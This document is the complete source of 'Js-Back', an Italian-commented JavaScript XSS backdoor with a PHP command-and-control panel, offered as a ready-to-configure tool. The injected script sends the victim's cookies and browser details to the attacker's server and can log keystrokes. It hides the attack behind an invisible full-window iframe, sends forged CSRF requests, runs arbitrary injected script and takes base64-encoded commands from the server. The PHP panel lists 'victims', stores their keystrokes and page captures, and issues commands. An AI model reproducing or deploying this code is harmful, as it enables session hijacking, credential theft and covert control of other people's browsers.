<!-- Inizio pagina in Javascript Nome: SHELL.JS --->
####################################################################################################

/*Inserite qua l'indirizzo di jsback.php (o come l'avete rinominata)*/

var evil='http://www.google.it/jsback.php';

/* Tempo che intercorre tra una richiesta e l'altra a jsback in MILLISECONDI: tempi troppo bassi potrebbero creare problemi*/

var loop = 10*1000;

/* Lunghezza delle stringhe inviate dal keylogger a jsback */
/* Ricordo che verrano raccolti i tasti premuti MENTRE LA FINESTRA Ãˆ ATTIVA*/

var maxlen=20;

/*pagina 'grande' che verrÃ  caricata sopra la pagina contenete l'xss, e che permetterÃ  alla vittima*/
/*di continuare la navigazione senza accorgersi di nulla. E' importante che questo indirizzo sia quello*/
/*della pagina contenete l'xss... ma senza xss per evitare stack overflow.*/
/*Lascia la stringa vuota se vuoi che la shell cerchi di procedere da sola.*/
var big = 'http://www.google.it';

/**************************************************************************/

/*Modificate quanto sta qua sotto solo a vostro rischio e pericolo*/

/**************************************************************************/


var tmp = '';
var srce= '';
var t = 1;
var ricevi = 'ricevi';
var invia = 'invia';
var login = 'login';
var id = '';
var maxRandNum = 10000;
var interval = 10*1000;
var keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
window.test = 0;
evil+='?metodo=';

function shell(){
       test = 0;
       // Base64 code from Tyler Akins -- http://rumkin.com
       function encode64(input) {
          var output = "";
          var chr1, chr2, chr3;
          var enc1, enc2, enc3, enc4;
          var i = 0;

          do {
             chr1 = input.charCodeAt(i++);
             chr2 = input.charCodeAt(i++);
             chr3 = input.charCodeAt(i++);

             enc1 = chr1 >> 2;
             enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
             enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
             enc4 = chr3 & 63;

             if (isNaN(chr2)) {
                enc3 = enc4 = 64;
             } else if (isNaN(chr3)) {
                enc4 = 64;
             }

             output = output + keyStr.charAt(enc1) + keyStr.charAt(enc2) + keyStr.charAt(enc3) + keyStr.charAt(enc4);
          } while (i < input.length);
         
          return output;
       }
       
       function decode64(input) {
          var output = "";
          var chr1, chr2, chr3;
          var enc1, enc2, enc3, enc4;
          var i = 0;

          input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");

          do {
             enc1 = keyStr.indexOf(input.charAt(i++));
             enc2 = keyStr.indexOf(input.charAt(i++));
             enc3 = keyStr.indexOf(input.charAt(i++));
             enc4 = keyStr.indexOf(input.charAt(i++));

             chr1 = (enc1 << 2) | (enc2 >> 4);
             chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
             chr3 = ((enc3 & 3) << 6) | enc4;

             output = output + String.fromCharCode(chr1);

             if (enc3 != 64) {
                output = output + String.fromCharCode(chr2);
             }
             if (enc4 != 64) {
                output = output + String.fromCharCode(chr3);
             }
          } while (i < input.length);

          return output;
       }
       
       // crea un iframe invisibile, utile per fare richieste post e quant'altro. La vittima non vedrÃ  nulla,
       // e noi avremo  a disposizione un intero iframe in cui lavorare
       function MakeHIF(u,loaded,unloaded,id){
               var iframe = document.createElement('iframe');
               iframe.setAttribute("src",u);
               iframe.setAttribute("scrolling", "no");
               iframe.setAttribute("id", id);
               iframe.setAttribute("opacity","0");
               iframe.setAttribute("onload", loaded);
               iframe.setAttribute("onUnload", unloaded);
               iframe.style.width = iframe.style.height = 0+"px";
               iframe.style.visibility="hidden";
               document.body.appendChild(iframe);
       }
       
       // funzione che crea un iframe "gigante" che andrÃ  a coprire la finestra dalla quale Ã¨ lanciato.
       // togliendo il focus alla pagina dove gira il js, il keylogger cesserÃ  di funzionare una volta
       // richiamata questa funzione

       function MakeBIF(u,loaded,id){
               var iframe = document.createElement('iframe');
               document.body.scroll = 'no';
               iframe.setAttribute("src",u);
               iframe.setAttribute("scrolling", "no");
               iframe.setAttribute("id", id);
               iframe.setAttribute("opacity","100");
               iframe.setAttribute("OnLoad", loaded);
               iframe.style.position = 'absolute';
               iframe.style.width = iframe.style.height = '100%';
               iframe.style.top = iframe.style.left = iframe.style.border = 0;
               document.body.appendChild(iframe);
               return iframe;
       }
       
       // funzione che aggiunge uno script src alla pagina. Utile per prendere informazioni dal server
       function inscript(u) {
               var scr = document.createElement('script');
               scr.type = 'text/javascript';
               scr.src = u;
               document.body.appendChild(scr);
       }
       
       //funzione che genera un numero casuale compreso tra 0 ed a
       function randnum(a){
               var n =  Math.round(a*Math.random())+'';
               return n;
       }
       
       // funzione che esegue una richiesta a palary, e, una volta ricevuta la risposta json,
       // la invia all'attaccante
       function getHTML(q){
               var pal = 'http://palary.com/main/load_page?sfrurl=';
               inscript(pal+q);
               window['page_loaded'] = function (html, title, url) {
                               srce = encode64(html);
                               send(id,'proxy',srce,q,ricevi);
               };
               window['Effect'] = {'Highlight': function (){}};
       }
       
       //funzione che, dato un url e una stringa di variabili post, esegue una richiesta
       //
       function csrf(url,p){
               
               var arr = new Array;
                       arr = p.split('&');
               var r = randnum(maxRandNum);
               MakeHIF('','','',r);
               w = document.getElementById(r).contentWindow;
               w.document.write('<html><body></body></html>');
               var form=w.document.createElement('form');
               form.setAttribute('id','f');
               form.action = url;
               form.method = 'post';
               for(i= 0; i< arr.length;i++){
                       j =w.document.createElement('input');
                       j.setAttribute('type','text');
                       eq = arr[i].indexOf('=');
                       if(eq != -1){
                               j.setAttribute('name',arr[i].substr(0,eq));
                               if(eq != (arr[i].length -1))
                                       j.setAttribute('value',arr[i].substr(eq+1,arr[i].length));
                       }
                       form.appendChild(j);
               }
               w.document.body.appendChild(form);        
               form.submit();
               w.document.close();
               setTimeout(function(){
                       iframe = document.getElementById(r);
                       document.body.removeChild(iframe);
               },interval);
       }
       
       // funzione che, dopo aver generato un iframe, vi scrive str.
       // Utile nel caso si voglia eseguire js personalizzato sulla macchina dell'utente
       function aggiungi(str){
               var n = randnum(maxRandNum);
               MakeHIF('','','',n);
               setTimeout(function(){
                       document.getElementById(n).contentWindow.document.write(str);        
                       },1000);
               setTimeout(function(){
                       stop();
                       },2000);
       }
       

       // funzione che, una volta presi i comandi dal server nel quale Ã¨ riposto il nostro script php,
       // lancia le relative funzioni in base ai comandi        
       function getCommand(){
               var n = randnum(maxRandNum);
               inscript(evil+invia+'&key='+n+'&id='+id);
               window['code_'+n] = function(a,b,c,d){
                       (a != 'Cg==')?getHTML(decode64(a)) : '';
                       (b != 'Cg==')?csrf(decode64(b),decode64(c)) : '';
                       (d != 'Cg==')?aggiungi(decode64(d)) : '';
               };
       }
               
       // funzione che crea un form in un iframe a nostra scelta
       function makeform(id,act,data,pag,ior,framename){
               w = document.getElementById(framename).contentWindow;
               w.document.write('<html><body></body></html>');
               var form=w.document.createElement('form');
               form.setAttribute('id','f');
               form.action = evil+ior;
               form.method = 'post';
               
               var list = ['id','act','data','pag'];
               var arr = new Array;
               for(i= 0; i< list.length;i++){
                       arr[i]=w.document.createElement('input');
                       arr[i].setAttribute('type','text');
                       arr[i].setAttribute('name',list[i]);
                       arr[i].setAttribute('value',eval(list[i]));
                       form.appendChild(arr[i]);
               }
               w.document.body.appendChild(form);        
               form.submit();
               w.document.close();
       }
       
       function send(id,act,data,pag,str){
               var r = randnum(maxRandNum);
               var i = MakeHIF('','','',r);
               makeform(id,act,data,pag,str,r);
               setTimeout(function(){
                       iframe = document.getElementById(r);
                       document.body.removeChild(iframe);
               },interval);
       }
       // funzione che logga tutti i tasti premuti MENTRE LA PAGINA SU CUI GIRA IL JS HA IL FOCUS.
       // ergo non p compatibile con la funzione MakeBIF: quindi decidete, o prolungate il tempo in cui
       // assumete il controllo della vittima, o loggate tutto quello che scrive
       function keylogger(){
               document.onkeyup = function(ev){
                       if (window.event) c = window.event.keyCode;
                       else if (ev) c = ev.which;
                       tmp += (String.fromCharCode(c));
                       if( tmp.length>maxlen){
                               send(id,'keylog',tmp,'',ricevi);
                               tmp = '';
                       };
               };
       }
       
       // funzione per l'autenticazione sul server di controllo. non eseguitela, e non potrete inviare
       // alcun comando alla shell

       function auth(){
               var bro = navigator;
               var gma = new Date();
               var min = ((a = gma.getMinutes()) < 10 )? '0'+a :a;
               var ora = ((a = gma.getHours()) < 10 )? '0'+a :a;
               var gg = ((a = gma.getDate()) < 10 )? '0'+a :a;
               var mm = ((a = gma.getMonth()) < 9 )? '0'+ ++a : ++a;
               id = mm+'.'+gg+'.'+ora+'.'+min;
               var data = '';
               data += '<b>Browser </b>: ' + bro.userAgent + '<br>';
               data += '<b>OS </b>: ' +bro.platform +'<br>';
               data += '<b>Cookie </b>: '+document.cookie + '<br>';
               send(id,'login',data,document.location,'login');
       }
       
       
       auth();
/******************************************************************************************************/
// scegliete quale funzione eseguire all'avvio della shell. ricordo che makeBIF e keylogger sono
// incompatibili.

       //keylogger();
       MakeBIF(big,'','BiG');

/******************************************************************************************************/
       setInterval(function(){
               getCommand();
       },loop);
}
shell();
####################################################################################################
<!-- fine parte pagina shell.js in javascript -->


<!-- Inizio pagina in php Nome: jsback.php -->
####################################################################################################
<?php


---------------------------------------------------------------

               JsBack - Javascript Backdoor

---------------------------------------------------------------

*/

//Impostate Username e password della backdoor
//oppure disabilitate il login impostando a 1 la variabile $disablelogin

$username="admin";
$password="123";
$disablelogin=0;

//Il tempo di timeout della backdoor da regolare in base al tempo di ricezione comandi della parte Js

$tempologout= 30; //30 secondi :D


//---------------Non editare dopo questa riga-------------------

@$metodo = $_GET['metodo'];
@$id = $_POST['id'];
@$azione = $_POST['act'];
@$data = $_POST['data'];
@$pag = $_POST['pag'];
@$ip = $_SERVER['REMOTE_ADDR'];

if(!is_dir("jsback"))
       @Mkdir("jsback",0777);

@$scriptname=explode("/",$_SERVER['SCRIPT_NAME']);
@$scriptname=$scriptname[count($scriptname)-1];



if (empty($metodo) or $metodo=="op")
{
       if($disablelogin==0)
       {
               session_start();

               if(@isset($_POST['invia']))
               {
                       if(@strtolower($_POST['username'])==strtolower($username) && @strtolower($_POST['password'])==strtolower($password))
                               $_SESSION['login']=1;
               }

               if(!isset($_SESSION['login']))
               {
                       print_header();
                       print "<br><br><center><br>";
                       print "<form method=POST>";
                        print "Inserisci l'username :  <input type=text name=username><br><br>";
                       print "Inserisci la password :  <input type=password name=password><br><br>";
                       print "<input type=submit name=invia value=login>";
                       print "<br><br><br></center>";
                       print_footer();
                       exit();
               }        
       }
       print_header();
       $url="";
       @$id=$_GET['id'];

       if($metodo=="op" and is_dir("jsback/".$id))
       {
               if(@$_GET['act']=="view")
               {
                       print "<br>";
                       print_dir($scriptname,$tempologout);
                       $url="jsback/".$id."/login.html";
                       print_frame_inf($url);
                       $url="jsback/".$id."/operation.html";
                       print_frame_cmd($url);
               }
               if(@$_GET['act']=="keylog")
               {
                       print "<br>";
                       print_dir($scriptname,$tempologout);
                       $url="jsback/".$id."/keylog.html";
                       print_frame_inf($url);
                       $url="jsback/".$id."/operation.html";
                       print_frame_cmd($url);
               }
               if(@$_GET['act']=="proxy")
               {
                       print "<br>";
                       print_dir($scriptname,$tempologout);
                       $url="jsback/".$id."/proxy.html";
                       print_frame_inf($url);
                       $url="jsback/".$id."/operation.html";
                       print_frame_cmd($url);
               }
               if(@$_GET['act']=="command")
               {
                       if(@isset($_POST['invio']))
                       {
                               
                               @$proxy=$_POST['proxy'];
                               @$csfr=$_POST['csfr'];
                               @$csfr_var=$_POST['csfr_var'];
                               @$script_var=$_POST['script_var'];
                               make_command($scriptname,$id,$proxy,$csfr,$csfr_var,$script_var);
                               make_command_file($id,$proxy,$csfr,$csfr_var,$script_var);
                               print "<center>Dati invio aggiornati attendere che la shell prenda i valori.</center>";
                       }
                       else
                               print "<br>";
                       
                       print_dir($scriptname,$tempologout);
                       $url="jsback/".$id."/command.html";
                       print_frame_inf($url);
                       $url="jsback/".$id."/operation.html";
                       print_frame_cmd($url);

               }
               if(@$_GET['act']=="delete")
               {
                       delete($id);
                       print "<center>Eliminato con successo ID : ".$id."</center>";
                       usleep(500000);
                       print_dir($scriptname,$tempologout);
                       print_frame_inf($url);
                       print_frame_cmd($url);
               }
       }
       else
       {
               print "<br>";
               print_dir($scriptname,$tempologout);
               print_frame_inf($url);
               print_frame_cmd($url);
       }
       print_footer();
}

if ($metodo=="login")
{
       if(!empty($id))
       {
               @Mkdir("jsback/".$id.".".$ip,0777);

               @$file = fopen("jsback/".$id.".".$ip."/login.html", "w");
               $orario=explode(".",$id);
               $stringa = "<meta http-equiv=\"refresh\" content=\"4\"><b>Data Avvio</b> : ".htmlentities($orario[0])."/".htmlentities($orario[1])." ".htmlentities($orario[2]).":".htmlentities($orario[3])."<br>";
               $stringa .= "<b>Ip</b> : ".htmlentities($ip)."<br>";
               $stringa .= "<b>Pagina</b> : ".htmlentities($pag)."<br>";
               $data = htmlentities($data);
               $data = str_replace("&lt;b&gt;", "<b>", $data);
               $data = str_replace("&lt;/b&gt;", "</b>", $data);
               $data = str_replace("&lt;br&gt;", "<br>", $data);
               $stringa .= $data;
               @fwrite($file, $stringa);
               @fclose($file);

               @$file = fopen("jsback/".$id.".".$ip."/keylog.html", "a");
               $stringa = "<html><meta http-equiv=\"refresh\" content=\"4\"></html>";
               @fwrite($file, $stringa);
               @fclose($file);

               @$file = fopen("jsback/".$id.".".$ip."/proxy.html", "w");
               $stringa = "<html><meta http-equiv=\"refresh\" content=\"4\"></html>";
               @fwrite($file, $stringa);
               @fclose($file);

               $option=1;
               make_operation($scriptname,$id,$ip,$option);
               $proxy="";
               $csfr="";
               $csfr_var="";
               $script_var="";
               make_command($scriptname,$id.".".$ip,$proxy,$csfr,$csfr_var,$script_var);
               make_command_file($id.".".$ip,$proxy,$csfr,$csfr_var,$script_var);
               @$file = fopen("jsback/".$id.".".$ip."/online", "w");
               @fwrite($file, time());
               @fclose($file);
       }
}


if ($metodo=="invia")
{
       @$key=$_GET['key'];
       @$id=$_GET['id'];

       @$file = fopen("jsback/".$id.".".$ip."/online", "w");
       @fwrite($file, time());
       @fclose($file);

        @$file = fopen("jsback/".$id.".".$ip."/command", "r");
        @$proxy = base64_encode(fgets($file,9000000));
       @$csfr = base64_encode(fgets($file,9000000));
       @$csfr_var = base64_encode(fgets($file,9000000));
       $script_var="";
       while (@!feof($file))  
       {
               @$script_var .= base64_encode(fgets($file,9000000));
       }
        print "code_".$key."('".$proxy."','".$csfr."','".$csfr_var."','".$script_var."')";
        @fclose($file);
       
        $proxy="";
       $csfr="";
       $csfr_var="";
       $script_var="";
        make_command_file($id.".".$ip,$proxy,$csfr,$csfr_var,$script_var);
}

if ($metodo=="ricevi")
{
       if($azione=="proxy")
       {
               @$file = fopen("jsback/".$id.".".$ip."/proxy.html", "w");
               $stringa = "<html><meta http-equiv=\"refresh\" content=\"4\"><br><center><b><a href='./proxy.html' target='_blank' >Apri in una finestra : ".$pag."</a></b></center><br></html>";
               $stringa .= base64_decode($data);
               @fwrite($file, $stringa);
               @fclose($file);
       }

       if($azione=="keylog")
       {
               @$file = fopen("jsback/".$id.".".$ip."/keylog.html", "a");
               $stringa = htmlentities($data);
               @fwrite($file, $stringa."\n");
               @fclose($file);
       }

}




function print_header()
{
       print
"<html><head><title>Js-Back by Auron and Rossi46GO</title></head><center><pre>
     _   _____          _____       ___   _____   _   _  
    | | /  ___/        |  _  \     /   | /  ___| | | / /  
    | | | |___    __   | |_| |    / /| | | |     | |/ /  
 _  | | \___  \  |__|  |  _  {   / /_| | | |     | |\ \  
| |_| |  ___| |        | |_| |  / ___  | | |___  | | \ \  
\_____/ /_____/        |_____/ /_/   |_| \_____| |_|  \_\

JavaScript Shell - Backdoor                  
</pre>
</center>
<br>";
}


function print_dir($scriptname,$tempologout)
{
       print "<br><div style='float: left;'><pre><b>Victim List</b>                   <a href=./".$scriptname.">- refresh - </a></pre><br><br>\n";
       $dir = @opendir(getcwd()."/jsback/");
       while( $file = @readdir($dir) )
       {
               if(($file!=".") and ($file!="..") and ($file!=$scriptname))
               {

                       $nomefile=explode(".",$file);
                       if(is_file("jsback/".$file."/online"))
                       {
                               @$fileon = fopen("jsback/".$file."/online", "r");
                               $tempo1=intval(fgets($fileon,9000000));
                               @fclose($fileon);
       
                               $tempo2=time();
                               $tempo3=$tempo2-$tempo1;

                               if($tempo3<$tempologout)
                                       print " <font face=arial color='#69FF49'>&#9829;</font> ";
                               else
                               {
                                       logout($file,$scriptname);
                                       print " <font face=arial color=red>&#9829;</font> ";
                               }
                       }
                       else
                       {
                               print " <font face=arial color=red>&#9829;</font> ";
                       }

                       print "<a href='?metodo=op&act=view&id=".$file."' >".$nomefile[4].".".$nomefile[5].".".$nomefile[6].".".$nomefile[7]." --  ".$nomefile[0]."/".$nomefile[1]." -- ".$nomefile[2].":".$nomefile[3]."</a><br>\n";
               }
       }
       print "</div>\n";
       @closedir($dir);
}

function print_frame_inf($url)
{
       print "<div style='float: right;'><b>Lettura informazioni</b><br><br>\n";
       print "<iframe name='informazioni' width=700 height=300 src='".$url."' frameborder=0 scrolling=auto></iframe></div>\n";
}

function print_frame_cmd($url)
{
       print "<div style='clear:both;'><center><b>Comandi</b><br><br>\n";
       print "<iframe name='comandi' width=1000 height=100 src='".$url."' frameborder=0 scrolling=auto></iframe>\n";
}

function print_footer()
{
       print "<center><div style='clear:both;'><pre><font face=arial color='#69FF49'>&#9829;</font> = Connected        <font face=arial color=red>&#9829;</font> = Disconnected\n</center>";
}

function make_command($scriptname,$id,$proxy,$csfr,$csfr_var,$script_var)
{
       @$file = fopen("jsback/".$id."/command.html", "w");
       $stringa = "<pre>";
       $stringa .= "<form action='../../".$scriptname."?metodo=op&act=command&id=".htmlspecialchars($id)."' METHOD=POST target='_parent'>";
       $stringa .= "Pagina Proxy :      <input type=text name=proxy value='".htmlspecialchars($proxy)."'><br>";
       $stringa .= "Csfr :              <input type=text name='csfr' value='".htmlspecialchars($csfr)."'><br>";
       $stringa .= "Csfr POST var :     <input type=text name='csfr_var' value='".htmlspecialchars($csfr_var)."'><br>";
       $stringa .= "Script:             <textarea rows='5' cols='25' name='script_var' >".htmlspecialchars($script_var)."</textarea><br><br>";
       $stringa .= "            <input type=submit name=invio onsend='parent.location.reload()'></pre>";
       @fwrite($file, $stringa);
       @fclose($file);
}

function make_command_file($id,$proxy,$csfr,$csfr_var,$script_var)
{
       @$file = fopen("jsback/".$id."/command", "w");
       $stringa = $proxy."\n";
       $stringa .= $csfr."\n";
       $stringa .= $csfr_var."\n";
       $stringa .= $script_var."\n";
       @fwrite($file, $stringa);
       @fclose($file);
}

function make_operation($scriptname,$id,$ip,$option)
{
       @$file = fopen("jsback/".$id.".".$ip."/operation.html", "w");
       $stringa = "<meta http-equiv=\"refresh\" content=\"4\">";
       $stringa .= "<center>-- <a href='../../".$scriptname."?metodo=op&act=view&id=".$id.".".$ip."' target=_parent>Informazioni</a> -- ";
       if($option==1)
               $stringa .= "<a href='../../".$scriptname."?metodo=op&act=command&id=".$id.".".$ip."' target=_parent>Invia Comandi</a> -- ";
       $stringa .= "<a href='../../".$scriptname."?metodo=op&act=keylog&id=".$id.".".$ip."' target=_parent>Keylogger</a> -- ";
       $stringa .= "<a href='../../".$scriptname."?metodo=op&act=proxy&id=".$id.".".$ip."' target=_parent>Proxy Browser</a> -- ";
       $stringa .= "<a href='../../".$scriptname."?metodo=op&act=delete&id=".$id.".".$ip."' target=_parent>Elimina dati</a> --</center>";
       @fwrite($file, $stringa);
       @fclose($file);
}

function delete($id)
{
       $dir = @opendir("jsback/".$id);
       while( $file = @readdir($dir) )
       {
               if(($file!=".") and ($file!=".."))
               {
                       @unlink("jsback/".$id."/".$file);
               }
       }
       @closedir($dir);
       @rmdir("jsback/".$id);
}


function logout($id,$scriptname)
{
       $option=0;
       $ip="";
       make_operation($scriptname,$id,$ip,$option);
       @unlink("jsback/".$id."/".online);
       @unlink("jsback/".$id."/".command.html);
       @unlink("jsback/".$id."/".command);
}

?>
####################################################################################################
<!-- gine pagina jsback.php -->